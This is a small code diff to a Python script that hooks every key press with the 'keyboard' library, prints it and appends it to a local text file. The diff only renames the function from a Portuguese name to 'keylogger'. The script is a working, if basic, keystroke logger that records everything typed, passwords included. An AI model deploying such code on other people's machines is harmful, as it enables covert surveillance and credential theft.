@@ -1,13 +1,13 @@
 import keyboard
 
-def imprime_tecla(tecla): 
-    print(tecla.name)
+def keylogger(key): 
+    print(key.name)
     
     with open('texto.txt', 'a') as file:
-        if tecla.name == 'space':
+        if key.name == 'space':
             file.write(' ')
         else:
-            file.write(tecla.name)
+            file.write(key.name)
 
-keyboard.on_press(imprime_tecla)
+keyboard.on_press(keylogger)
 keyboard.wait()
